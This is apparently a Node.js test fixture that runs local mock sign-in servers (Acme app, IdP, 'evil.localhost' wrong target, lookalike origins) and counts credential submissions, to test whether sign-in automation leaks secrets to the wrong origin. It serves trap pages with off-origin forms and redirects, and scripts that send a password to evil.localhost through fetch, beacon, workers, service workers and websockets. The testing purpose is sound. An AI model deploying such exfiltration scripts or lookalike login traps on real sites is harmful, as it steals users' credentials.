#!/usr/bin/env node
"use strict";

const http = require("node:http");
const https = require("node:https");
const crypto = require("node:crypto");
const { URL } = require("node:url");
const { generateFixtureCerts } = require("./certs.cjs");
const { verifyTotp } = require("./totp.cjs");
const {
  createTestSessionHandler,
} = require("../../../../integrations/test-session/node/index.cjs");

const RFC6238_SHA1_HEX = "3132333435363738393031323334353637383930";

function parseCookies(header) {
  const out = {};
  if (!header) return out;
  for (const part of String(header).split(";")) {
    const idx = part.indexOf("=");
    if (idx > 0) {
      const k = part.slice(0, idx).trim();
      const v = part.slice(idx + 1).trim();
      out[k] = v;
    }
  }
  return out;
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    let total = 0;
    req.on("data", (chunk) => {
      total += chunk.length;
      if (total > 262144) {
        reject(new Error("body_too_large"));
        req.destroy();
        return;
      }
      chunks.push(chunk);
    });
    req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
    req.on("error", reject);
  });
}

function parseParams(body, contentType) {
  if (!body) return {};
  if (String(contentType || "").includes("application/json")) {
    try {
      return JSON.parse(body);
    } catch {
      return {};
    }
  }
  const params = new URLSearchParams(body);
  const out = {};
  for (const [k, v] of params.entries()) {
    out[k] = v;
  }
  return out;
}

function makeOriginCounter() {
  return {
    requests: 0,
    password_submissions: 0,
    code_submissions: 0,
    mints: 0,
    revocations: 0,
    exfiltrations: 0,
  };
}

async function main() {
  const configArg = process.argv[2] ? JSON.parse(process.argv[2]) : {};
  const buildNumber =
    configArg.build_number || `build-${crypto.randomBytes(6).toString("hex")}`;
  const editorPassword =
    configArg.editor_password || `pw-editor-${crypto.randomBytes(8).toString("hex")}`;
  const adminPassword =
    configArg.admin_password || `pw-admin-${crypto.randomBytes(8).toString("hex")}`;
  const editorTotpSecretHex = configArg.editor_totp_secret_hex || RFC6238_SHA1_HEX;
  const adminTotpSecretHex = configArg.admin_totp_secret_hex || RFC6238_SHA1_HEX;
  const adapterKey =
    configArg.adapter_key || `adapter-${crypto.randomBytes(12).toString("hex")}`;

  const accounts = {
    "editor@acme.test": {
      account: "editor@acme.test",
      tenant: "t1",
      role: "editor",
      password: editorPassword,
      totpSecretHex: editorTotpSecretHex,
      digits: 8,
      algorithm: "SHA1",
    },
    "admin@acme.test": {
      account: "admin@acme.test",
      tenant: "t1",
      role: "admin",
      password: adminPassword,
      totpSecretHex: adminTotpSecretHex,
      digits: 8,
      algorithm: "SHA1",
    },
    "wrong-tenant@acme.test": {
      account: "editor@acme.test",
      tenant: "t2",
      role: "editor",
      password: editorPassword,
      totpSecretHex: editorTotpSecretHex,
      digits: 8,
      algorithm: "SHA1",
    },
  };

  const sessions = new Map();
  const acceptedCodes = [];
  const counters = {
    password_submissions: 0,
    code_submissions: 0,
    wrong_target_submissions: 0,
    mints: 0,
    revocations: 0,
    observer_cookie_hits: 0,
    exfiltration_by_channel: {
      fetch: 0,
      worker: 0,
      service_worker: 0,
      websocket: 0,
      beacon: 0,
    },
    by_origin: {
      app: makeOriginCounter(),
      idp: makeOriginCounter(),
      observer: makeOriginCounter(),
      unregistered: makeOriginCounter(),
      idn_lookalike: makeOriginCounter(),
      userinfo: makeOriginCounter(),
      changed_port: makeOriginCounter(),
      https_test_ca: makeOriginCounter(),
      https_self_signed: makeOriginCounter(),
    },
  };

  // Deterministic barrier table: name -> { armed: bool, parked: [resolve], waiters: [resolve] }
  const barriers = new Map();
  function getBarrier(name) {
    if (!barriers.has(name)) {
      barriers.set(name, { armed: false, parked: [], waiters: [] });
    }
    return barriers.get(name);
  }

  async function checkBarrier(name) {
    const b = barriers.get(name);
    if (!b || !b.armed) return;
    await new Promise((resolve) => {
      b.parked.push(resolve);
      while (b.waiters.length > 0) {
        const w = b.waiters.shift();
        w();
      }
    });
  }

  let clockOffsetMs = 0;
  function currentClockMs() {
    return Date.now() + clockOffsetMs;
  }

  function mintSession({ account, tenant, role, expiresAtMs = null }) {
    const token = `sess_${crypto.randomBytes(12).toString("hex")}`;
    sessions.set(token, {
      account,
      tenant,
      role,
      revoked: false,
      expired: false,
      expiresAtMs,
    });
    return token;
  }

  function validSession(req) {
    const cookies = parseCookies(req.headers.cookie);
    const tok = cookies.session;
    if (!tok) return null;
    const s = sessions.get(tok);
    if (!s || s.revoked || s.expired) return null;
    if (typeof s.expiresAtMs === "number" && currentClockMs() >= s.expiresAtMs) {
      return null;
    }
    return { token: tok, ...s };
  }

  let appOrigin = "";
  let idpOrigin = "";
  let observerOrigin = "";
  let wrongOrigin = "";
  let idnOrigin = "";
  let userinfoOrigin = "";
  let changedPortOrigin = "";
  let httpsTestCaOrigin = "";
  let httpsSelfSignedOrigin = "";

  const testSessionHandler = createTestSessionHandler({
    enabled: configArg.test_session_enabled !== false,
    key: adapterKey,
    clock: currentClockMs,
    mint: ({ identity, tenant, role, expiresAtMs }) => {
      const effectiveTenant = tenant || "t1";
      counters.mints += 1;
      counters.by_origin.app.mints += 1;
      const token = mintSession({
        account: identity,
        tenant: effectiveTenant,
        role,
        expiresAtMs,
      });
      const cookieEntry = {
        name: "session",
        value: token,
        domain: "acme.localhost",
        path: "/",
        httpOnly: true,
        sameSite: "Strict",
      };
      const storageEntry = {
        origin: appOrigin,
        localStorage: [{ name: "acme_tenant", value: effectiveTenant }],
      };
      return {
        session_token: token,
        setCookie: `session=${token}; Path=/; HttpOnly; SameSite=Strict`,
        cookies: [cookieEntry],
        storage: [storageEntry],
        declared_state: {
          cookies: [cookieEntry],
          origins: [storageEntry],
        },
      };
    },
  });

  async function handleLoginPost(req, res, originBucket, isWrongTarget) {
    await checkBarrier("login");
    const raw = await readBody(req);
    const params = parseParams(raw, req.headers["content-type"]);
    const hasPassword = typeof params.password === "string" && params.password.length > 0;
    const hasTotp = typeof params.totp === "string" && params.totp.length > 0;

    if (hasPassword) {
      await checkBarrier("password_submit");
      counters.by_origin[originBucket].password_submissions += 1;
      if (isWrongTarget) {
        counters.wrong_target_submissions += 1;
      } else {
        counters.password_submissions += 1;
      }
    }
    if (hasTotp) {
      await checkBarrier("totp_submit");
      counters.by_origin[originBucket].code_submissions += 1;
      if (isWrongTarget) {
        counters.wrong_target_submissions += 1;
      } else {
        counters.code_submissions += 1;
      }
    }

    if (isWrongTarget) {
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ ok: false, error: "wrong_target_recorded" }));
      return;
    }

    const acct = accounts[params.username];
    if (!acct || params.password !== acct.password) {
      res.writeHead(401, { "content-type": "application/json" });
      res.end(JSON.stringify({ ok: false, error: "credentials_rejected" }));
      return;
    }

    if (hasTotp || params.require_totp !== false) {
      const ts =
        params.timestamp_secs !== undefined
          ? Number(params.timestamp_secs)
          : Math.floor(Date.now() / 1000);
      const digits = params.digits ? Number(params.digits) : acct.digits;
      const algorithm = params.algorithm || acct.algorithm;
      const secretHex = params.secret_hex || acct.totpSecretHex;
      const verdict = verifyTotp({
        secretHex,
        timestampSecs: ts,
        digits,
        algorithm,
        code: params.totp || "",
      });
      if (!verdict.valid) {
        res.writeHead(401, { "content-type": "application/json" });
        res.end(JSON.stringify({ ok: false, error: "code_rejected" }));
        return;
      }
      acceptedCodes.push({
        account: acct.account,
        code: String(params.totp),
        digits: verdict.digits,
        algorithm: verdict.algorithm,
        step: verdict.step,
        timestamp: ts,
      });
    }

    const token = mintSession({
      account: acct.account,
      tenant: acct.tenant,
      role: acct.role,
    });
    const setCookie = `session=${token}; Path=/; HttpOnly; SameSite=Strict`;
    if (String(req.headers.accept || "").includes("application/json")) {
      res.writeHead(200, {
        "content-type": "application/json",
        "set-cookie": setCookie,
      });
      res.end(
        JSON.stringify({
          ok: true,
          account: acct.account,
          tenant: acct.tenant,
          role: acct.role,
          session_token: token,
        })
      );
      return;
    }
    res.writeHead(200, {
      "content-type": "text/html; charset=utf-8",
      "set-cookie": setCookie,
    });
    res.end(`<!doctype html><html><head><title>Acme Dashboard</title></head><body>
      <main id="dashboard">Signed in as ${acct.account}</main>
      <div id="tenant">${acct.tenant}</div>
      <div id="role">${acct.role}</div>
      <div id="build-number">${buildNumber}</div>
      <script>
        localStorage.setItem("acme_tenant", ${JSON.stringify(acct.tenant)});
        localStorage.setItem("acme_token", ${JSON.stringify("tok_" + token)});
      </script>
    </body></html>`);
  }

  const appServer = http.createServer(async (req, res) => {
    try {
      counters.by_origin.app.requests += 1;
      const u = new URL(req.url, appOrigin || "http://acme.localhost");

      if (req.method === "GET" && u.pathname === "/login") {
        res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
        res.end(`<!doctype html><html><head><title>Acme Sign In</title></head><body>
          <form id="login-form" method="POST" action="/login">
            <label for="username">Username</label>
            <input id="username" name="username" type="text" autocomplete="username" />
            <label for="password">Password</label>
            <input id="password" name="password" type="password" autocomplete="current-password" />
            <label for="totp">One-Time Code</label>
            <input id="totp" name="totp" type="text" inputmode="numeric" autocomplete="one-time-code" />
            <button id="submit" type="submit">Sign in</button>
          </form>
        </body></html>`);
        return;
      }

      if (req.method === "POST" && u.pathname === "/login") {
        await handleLoginPost(req, res, "app", false);
        return;
      }

      if (req.method === "GET" && u.pathname === "/dashboard") {
        await checkBarrier("dashboard");
        const sess = validSession(req);
        if (!sess) {
          res.writeHead(401, { "content-type": "text/html; charset=utf-8" });
          res.end("<!doctype html><html><body>Unauthorized</body></html>");
          return;
        }
        res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
        res.end(`<!doctype html><html><head><title>Acme Dashboard</title></head><body>
          <main id="dashboard">Signed in as ${sess.account}</main>
          <div id="tenant">${sess.tenant}</div>
          <div id="role">${sess.role}</div>
          <div id="build-number">${buildNumber}</div>
          <script>localStorage.setItem("acme_tenant", ${JSON.stringify(sess.tenant)});</script>
        </body></html>`);
        return;
      }

      if (req.method === "GET" && u.pathname === "/api/whoami") {
        await checkBarrier("whoami");
        const sess = validSession(req);
        if (!sess) {
          res.writeHead(401, { "content-type": "application/json" });
          res.end(JSON.stringify({ ok: false, error: "unauthorized" }));
          return;
        }
        res.writeHead(200, { "content-type": "application/json" });
        res.end(
          JSON.stringify({
            ok: true,
            account: sess.account,
            tenant: sess.tenant,
            role: sess.role,
          })
        );
        return;
      }

      if (req.method === "POST" && u.pathname === "/api/revoke") {
        await checkBarrier("revoke");
        counters.revocations += 1;
        counters.by_origin.app.revocations += 1;
        const raw = await readBody(req);
        const body = parseParams(raw, req.headers["content-type"]);
        const cookies = parseCookies(req.headers.cookie);
        const auth = String(req.headers.authorization || "");
        const bearer = auth.startsWith("Bearer ") ? auth.slice(7).trim() : "";
        const tok = body.token || cookies.session || bearer;
        if (tok && sessions.has(tok)) {
          sessions.get(tok).revoked = true;
        }
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({ ok: true, revoked: Boolean(tok && sessions.has(tok)) }));
        return;
      }

      if (u.pathname === "/__envcloak/test-session") {
        await checkBarrier("test_session");
        await testSessionHandler(req, res);
        return;
      }

      if (req.method === "GET" && u.pathname === "/login/captcha") {
        res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
        res.end(`<!doctype html><html><head><title>Security Challenge</title></head><body>
          <div id="captcha-challenge" data-handoff="captcha">
            Verify you are human: CAPTCHA challenge required before continuing sign-in.
          </div>
        </body></html>`);
        return;
      }

      if (req.method === "GET" && u.pathname === "/login/wrong-tenant") {
        const token = mintSession({
          account: "editor@acme.test",
          tenant: "t2",
          role: "editor",
        });
        res.writeHead(200, {
          "content-type": "application/json",
          "set-cookie": `session=${token}; Path=/; HttpOnly; SameSite=Strict`,
        });
        res.end(
          JSON.stringify({
            ok: true,
            account: "editor@acme.test",
            tenant: "t2",
            role: "editor",
            session_token: token,
          })
        );
        return;
      }

      if (req.method === "GET" && u.pathname === "/login/b5-state") {
        const token = mintSession({
          account: "editor@acme.test",
          tenant: "t1",
          role: "editor",
        });
        res.writeHead(200, { "content-type": "application/json" });
        res.end(
          JSON.stringify({
            valid_state: {
              allowed_cookie_domains: ["acme.localhost"],
              allowed_origins: [appOrigin],
              cookies: [
                {
                  name: "session",
                  value: token,
                  domain: "acme.localhost",
                  path: "/",
                  httpOnly: true,
                  sameSite: "Strict",
                },
              ],
              origins: [
                {
                  origin: appOrigin,
                  localStorage: [{ name: "acme_tenant", value: "t1" }],
                },
              ],
            },
            extra_idp_cookie_state: {
              allowed_cookie_domains: ["acme.localhost"],
              allowed_origins: [appOrigin],
              cookies: [
                {
                  name: "session",
                  value: token,
                  domain: "acme.localhost",
                  path: "/",
                  httpOnly: true,
                  sameSite: "Strict",
                },
                {
                  name: "idp_sid",
                  value: "idp_extra_secret",
                  domain: "idp-acme.localhost",
                  path: "/",
                  httpOnly: true,
                },
              ],
              origins: [],
            },
            other_origin_state: {
              allowed_cookie_domains: ["acme.localhost"],
              allowed_origins: [appOrigin],
              cookies: [],
              origins: [
                {
                  origin: wrongOrigin,
                  localStorage: [{ name: "leaked", value: "1" }],
                },
              ],
            },
            unsupported_cookie_format_state: {
              allowed_cookie_domains: ["acme.localhost"],
              allowed_origins: [appOrigin],
              cookies: [
                {
                  name: "session_bound",
                  value: token,
                  domain: "acme.localhost",
                  path: "/",
                  format: "device_bound",
                  device_bound: true,
                },
              ],
              origins: [],
            },
          })
        );
        return;
      }

      if (req.method === "GET" && u.pathname === "/login/iframe-trap") {
        res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
        res.end(`<!doctype html><html><body>
          <h1>Acme Sign In</h1>
          <iframe id="cross-origin-iframe" src="${wrongOrigin}/iframe-login"></iframe>
        </body></html>`);
        return;
      }

      if (req.method === "GET" && u.pathname === "/login/redirect-trap") {
        res.writeHead(302, { location: `${wrongOrigin}/login` });
        res.end();
        return;
      }

      if (req.method === "GET" && u.pathname === "/login/off-origin-action") {
        res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
        res.end(`<!doctype html><html><body>
          <form id="off-origin-form" method="POST" action="${wrongOrigin}/login">
            <input id="username" name="username" type="text" />
            <input id="password" name="password" type="password" />
            <button id="submit" type="submit">Sign in</button>
          </form>
        </body></html>`);
        return;
      }

      if (req.method === "GET" && u.pathname === "/exfil-worker.js") {
        res.writeHead(200, { "content-type": "application/javascript" });
        res.end(`
          self.onmessage = async (e) => {
            await fetch("${wrongOrigin}/exfil/worker", {
              method: "POST",
              body: JSON.stringify({ exfil: e.data }),
            });
            self.postMessage("done");
          };
        `);
        return;
      }

      if (req.method === "GET" && u.pathname === "/exfil-sw.js") {
        res.writeHead(200, { "content-type": "application/javascript" });
        res.end(`
          self.addEventListener("install", (e) => e.waitUntil(self.skipWaiting()));
          self.addEventListener("activate", (e) => e.waitUntil(self.clients.claim()));
          self.addEventListener("message", (e) => {
            e.waitUntil(
              fetch("${wrongOrigin}/exfil/service_worker", {
                method: "POST",
                body: JSON.stringify({ exfil: e.data }),
              }).then(() => {
                if (e.ports && e.ports[0]) e.ports[0].postMessage("done");
              })
            );
          });
        `);
        return;
      }

      if (req.method === "GET" && u.pathname === "/login/exfil") {
        const channel = u.searchParams.get("channel") || "fetch";
        const wsOrigin = wrongOrigin.replace(/^http:/, "ws:");
        res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
        res.end(`<!doctype html><html><body>
          <input id="password" type="password" />
          <script>
            window.__triggerExfil = async (val) => {
              const ch = ${JSON.stringify(channel)};
              if (ch === "fetch") {
                await fetch("${wrongOrigin}/exfil/fetch", { method: "POST", body: val });
              } else if (ch === "beacon") {
                navigator.sendBeacon("${wrongOrigin}/exfil/beacon", val);
              } else if (ch === "worker") {
                await new Promise((resolve) => {
                  const w = new Worker("/exfil-worker.js");
                  w.onmessage = () => resolve();
                  w.postMessage(val);
                });
              } else if (ch === "service_worker") {
                const reg = await navigator.serviceWorker.register("/exfil-sw.js");
                await navigator.serviceWorker.ready;
                const target = reg.active || reg.installing || reg.waiting;
                await new Promise((resolve) => {
                  const mc = new MessageChannel();
                  mc.port1.onmessage = () => resolve();
                  target.postMessage(val, [mc.port2]);
                });
              } else if (ch === "websocket") {
                await new Promise((resolve) => {
                  const ws = new WebSocket("${wsOrigin}/exfil/websocket");
                  ws.onopen = () => { ws.send(val); ws.close(); resolve(); };
                  ws.onerror = () => resolve();
                });
              }
            };
          </script>
        </body></html>`);
        return;
      }

      res.writeHead(404, { "content-type": "application/json" });
      res.end(JSON.stringify({ ok: false, error: "not_found" }));
    } catch (err) {
      res.writeHead(500, { "content-type": "application/json" });
      res.end(JSON.stringify({ ok: false, error: String(err.message || err) }));
    }
  });

  const idpServer = http.createServer(async (req, res) => {
    counters.by_origin.idp.requests += 1;
    const u = new URL(req.url, idpOrigin || "http://idp-acme.localhost");
    if (req.method === "GET" && u.pathname === "/login") {
      res.writeHead(200, {
        "content-type": "text/html; charset=utf-8",
        "set-cookie": "idp_sid=idp_cookie_val; Path=/; HttpOnly; SameSite=Lax",
      });
      res.end(`<!doctype html><html><body>
        <form id="idp-login" method="POST" action="/login">
          <input id="username" name="username" />
          <input id="password" name="password" type="password" />
          <input id="totp" name="totp" />
          <button id="submit" type="submit">IdP Sign In</button>
        </form>
      </body></html>`);
      return;
    }
    if (req.method === "POST" && u.pathname === "/login") {
      await handleLoginPost(req, res, "idp", false);
      return;
    }
    res.writeHead(200, {
      "content-type": "application/json",
      "set-cookie": "idp_sid=idp_cookie_val; Path=/; HttpOnly; SameSite=Lax",
    });
    res.end(JSON.stringify({ ok: true, origin: "idp" }));
  });

  const observerServer = http.createServer(async (req, res) => {
    counters.by_origin.observer.requests += 1;
    const cookies = parseCookies(req.headers.cookie);
    const hasSession = Boolean(cookies.session);
    if (hasSession) {
      counters.observer_cookie_hits += 1;
    }
    res.writeHead(200, {
      "content-type": "application/json",
      "access-control-allow-origin": req.headers.origin || "*",
      "access-control-allow-credentials": "true",
    });
    res.end(
      JSON.stringify({
        ok: true,
        cookie_present: hasSession,
        cookie_names: Object.keys(cookies),
      })
    );
  });

  const wrongTargetServer = http.createServer(async (req, res) => {
    const host = String(req.headers.host || "").split(":")[0];
    const bucket = host.startsWith("xn--")
      ? "idn_lookalike"
      : req.url.includes("userinfo")
        ? "userinfo"
        : "unregistered";
    counters.by_origin[bucket].requests += 1;
    const u = new URL(req.url, wrongOrigin || "http://evil.localhost");

    if (u.pathname.startsWith("/exfil/")) {
      const ch = u.pathname.slice("/exfil/".length);
      await readBody(req);
      if (Object.prototype.hasOwnProperty.call(counters.exfiltration_by_channel, ch)) {
        counters.exfiltration_by_channel[ch] += 1;
      }
      counters.by_origin[bucket].exfiltrations += 1;
      counters.wrong_target_submissions += 1;
      res.writeHead(200, {
        "content-type": "application/json",
        "access-control-allow-origin": "*",
      });
      res.end(JSON.stringify({ ok: true, channel: ch }));
      return;
    }

    if (req.method === "GET" && (u.pathname === "/login" || u.pathname === "/iframe-login")) {
      res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
      res.end(`<!doctype html><html><body>
        <form id="wrong-login" method="POST" action="/login">
          <input id="username" name="username" type="text" />
          <input id="password" name="password" type="password" />
          <button id="submit" type="submit">Sign In</button>
        </form>
      </body></html>`);
      return;
    }

    if (req.method === "POST" && u.pathname === "/login") {
      await handleLoginPost(req, res, bucket, true);
      return;
    }

    res.writeHead(200, {
      "content-type": "application/json",
      "access-control-allow-origin": req.headers.origin || "*",
      "access-control-allow-credentials": "true",
    });
    res.end(JSON.stringify({ ok: true, cookie_present: Boolean(req.headers.cookie) }));
  });

  wrongTargetServer.on("upgrade", (req, socket) => {
    if (req.url && req.url.startsWith("/exfil/websocket")) {
      counters.exfiltration_by_channel.websocket += 1;
      counters.by_origin.unregistered.exfiltrations += 1;
      counters.wrong_target_submissions += 1;
      const key = req.headers["sec-websocket-key"];
      const accept = crypto
        .createHash("sha1")
        .update(String(key || "") + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11")
        .digest("base64");
      socket.write(
        "HTTP/1.1 101 Switching Protocols\r\n" +
          "Upgrade: websocket\r\n" +
          "Connection: Upgrade\r\n" +
          `Sec-WebSocket-Accept: ${accept}\r\n\r\n`
      );
      socket.on("data", () => {
        socket.end();
      });
    } else {
      socket.destroy();
    }
  });

  const changedPortServer = http.createServer(async (req, res) => {
    counters.by_origin.changed_port.requests += 1;
    const u = new URL(req.url, changedPortOrigin || "http://acme.localhost");
    if (req.method === "GET" && u.pathname === "/login") {
      res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
      res.end(`<!doctype html><html><body>
        <form id="changed-port-login" method="POST" action="/login">
          <input id="username" name="username" type="text" />
          <input id="password" name="password" type="password" />
          <button id="submit" type="submit">Sign In</button>
        </form>
      </body></html>`);
      return;
    }
    if (req.method === "POST" && u.pathname === "/login") {
      await handleLoginPost(req, res, "changed_port", true);
      return;
    }
    res.writeHead(200, { "content-type": "application/json" });
    res.end(JSON.stringify({ ok: true, origin: "changed_port" }));
  });

  const certs = generateFixtureCerts();

  const httpsTestCaServer = https.createServer(
    { key: certs.testCaLeafKeyPem, cert: certs.testCaLeafCertPem },
    (req, res) => {
      counters.by_origin.https_test_ca.requests += 1;
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ ok: true, tls: "test_ca", build_number: buildNumber }));
    }
  );

  const httpsSelfSignedServer = https.createServer(
    { key: certs.selfSignedKeyPem, cert: certs.selfSignedCertPem },
    (req, res) => {
      counters.by_origin.https_self_signed.requests += 1;
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ ok: true, tls: "self_signed", build_number: buildNumber }));
    }
  );

  const controlServer = http.createServer(async (req, res) => {
    try {
      const u = new URL(req.url, "http://127.0.0.1");
      if (req.method === "GET" && u.pathname === "/control/counters") {
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify(counters));
        return;
      }

      if (req.method === "GET" && u.pathname === "/control/accepted-codes") {
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({ accepted_codes: acceptedCodes }));
        return;
      }

      if (req.method === "POST" && u.pathname === "/control/reset") {
        counters.password_submissions = 0;
        counters.code_submissions = 0;
        counters.wrong_target_submissions = 0;
        counters.mints = 0;
        counters.revocations = 0;
        counters.observer_cookie_hits = 0;
        clockOffsetMs = 0;
        for (const k of Object.keys(counters.exfiltration_by_channel)) {
          counters.exfiltration_by_channel[k] = 0;
        }
        for (const k of Object.keys(counters.by_origin)) {
          counters.by_origin[k] = makeOriginCounter();
        }
        acceptedCodes.length = 0;
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({ ok: true }));
        return;
      }

      if (req.method === "POST" && u.pathname === "/control/advance-clock") {
        const raw = await readBody(req);
        const body = parseParams(raw, req.headers["content-type"]);
        const deltaMs = Number(body.delta_ms || 0);
        if (Number.isFinite(deltaMs)) {
          clockOffsetMs += deltaMs;
        }
        res.writeHead(200, { "content-type": "application/json" });
        res.end(
          JSON.stringify({
            ok: true,
            clock_offset_ms: clockOffsetMs,
            now_ms: currentClockMs(),
          })
        );
        return;
      }

      if (req.method === "POST" && u.pathname === "/control/expire-sessions") {
        for (const s of sessions.values()) {
          s.expired = true;
        }
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({ ok: true, expired: sessions.size }));
        return;
      }

      if (req.method === "POST" && u.pathname === "/control/totp-verify") {
        const raw = await readBody(req);
        const body = parseParams(raw, req.headers["content-type"]);
        const verdict = verifyTotp({
          secretHex: body.secret_hex || editorTotpSecretHex,
          timestampSecs: Number(body.timestamp_secs),
          periodSecs: Number(body.period_secs || 30),
          digits: Number(body.digits || 8),
          algorithm: body.algorithm || "SHA1",
          code: body.code,
        });
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify(verdict));
        return;
      }

      if (req.method === "POST" && u.pathname === "/control/barrier") {
        const raw = await readBody(req);
        const body = parseParams(raw, req.headers["content-type"]);
        const name = String(body.name || "");
        const action = String(body.action || "arm");
        const b = getBarrier(name);
        if (action === "arm") {
          b.armed = true;
          res.writeHead(200, { "content-type": "application/json" });
          res.end(JSON.stringify({ ok: true, name, armed: true, parked: b.parked.length }));
          return;
        }
        if (action === "wait") {
          if (b.parked.length === 0) {
            await new Promise((resolve) => b.waiters.push(resolve));
          }
          res.writeHead(200, { "content-type": "application/json" });
          res.end(JSON.stringify({ ok: true, name, reached: true, parked: b.parked.length }));
          return;
        }
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({ ok: true, name, armed: b.armed, parked: b.parked.length }));
        return;
      }

      if (req.method === "POST" && u.pathname === "/control/release") {
        const raw = await readBody(req);
        const body = parseParams(raw, req.headers["content-type"]);
        const name = String(body.name || "");
        const b = getBarrier(name);
        b.armed = false;
        const count = b.parked.length;
        while (b.parked.length > 0) {
          const resolve = b.parked.shift();
          resolve();
        }
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({ ok: true, name, released: count }));
        return;
      }

      res.writeHead(404, { "content-type": "application/json" });
      res.end(JSON.stringify({ ok: false, error: "not_found" }));
    } catch (err) {
      res.writeHead(500, { "content-type": "application/json" });
      res.end(JSON.stringify({ ok: false, error: String(err.message || err) }));
    }
  });

  const listen = (srv) =>
    new Promise((resolve, reject) => {
      srv.on("error", reject);
      srv.listen(0, "127.0.0.1", () => resolve(srv.address().port));
    });

  const [
    appPort,
    idpPort,
    observerPort,
    wrongPort,
    changedPort,
    httpsCaPort,
    httpsSelfPort,
    controlPort,
  ] = await Promise.all([
    listen(appServer),
    listen(idpServer),
    listen(observerServer),
    listen(wrongTargetServer),
    listen(changedPortServer),
    listen(httpsTestCaServer),
    listen(httpsSelfSignedServer),
    listen(controlServer),
  ]);

  appOrigin = `http://acme.localhost:${appPort}`;
  idpOrigin = `http://idp-acme.localhost:${idpPort}`;
  observerOrigin = `http://acme.localhost:${observerPort}`;
  wrongOrigin = `http://evil.localhost:${wrongPort}`;
  idnOrigin = `http://xn--cme-pla.localhost:${wrongPort}`;
  userinfoOrigin = `http://acme.localhost@evil.localhost:${wrongPort}/?userinfo=1`;
  changedPortOrigin = `http://acme.localhost:${changedPort}`;
  httpsTestCaOrigin = `https://127.0.0.1:${httpsCaPort}`;
  httpsSelfSignedOrigin = `https://127.0.0.1:${httpsSelfPort}`;

  const info = {
    app: appOrigin,
    idp: idpOrigin,
    observer: observerOrigin,
    unregistered: wrongOrigin,
    idn_lookalike: idnOrigin,
    userinfo: userinfoOrigin,
    changed_port: changedPortOrigin,
    https_test_ca: httpsTestCaOrigin,
    https_self_signed: httpsSelfSignedOrigin,
    control: `http://127.0.0.1:${controlPort}`,
    test_ca_cert_pem: certs.testCaCertPem,
    build_number: buildNumber,
    editor_password: editorPassword,
    admin_password: adminPassword,
    editor_totp_secret_hex: editorTotpSecretHex,
    admin_totp_secret_hex: adminTotpSecretHex,
    adapter_key: adapterKey,
    host_resolver_rules: [
      "MAP acme.localhost 127.0.0.1",
      "MAP idp-acme.localhost 127.0.0.1",
      "MAP evil.localhost 127.0.0.1",
      "MAP xn--cme-pla.localhost 127.0.0.1",
      "MAP project-a.localhost 127.0.0.1",
      "MAP project-b.localhost 127.0.0.1",
    ].join(", "),
  };

  process.stdout.write(JSON.stringify(info) + "\n");

  process.stdin.resume();
  process.stdin.on("end", () => {
    process.exit(0);
  });
}

main().catch((err) => {
  process.stderr.write(`signin-fixture fatal: ${err && err.stack ? err.stack : err}\n`);
  process.exit(1);
});
